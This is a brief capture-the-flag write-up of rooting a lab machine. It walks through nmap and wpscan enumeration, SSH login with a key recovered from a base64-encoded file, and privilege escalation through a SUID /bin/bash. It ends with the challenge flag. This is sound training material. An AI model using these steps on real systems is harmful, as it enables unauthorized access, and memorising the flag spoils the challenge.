We start to enumerate the machine with an nmap scan: 
```
nmap -sV -sC -T4 -vv 10.0.0.20
```
ports 80 & 22 are open. We alos found the secret.txt file with the scan as well and got a base 64 encrypted message that we decrypted into an ssh key with cyberchef.

We visit the website and find out that it is a wordpress website and begin to use wpscan"
```
wpscan --url http://10.0.0.20/ 

wpscan --url http://10.0.0.20/ -e u 
```

We founbd both the admin user and the oscp user.

and decided to try and ssh in with the oscp user :
```
ssh -i id_rsa oscp@10.0.0.20
```
we then ran the command
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
and found out that we could run /bin/bash with suid priveleadges
```
/bin/bash -p
```
System has been rooted action is no longer required.

flag:
```
d73b04b0e696b0945283defa3eee4538
```

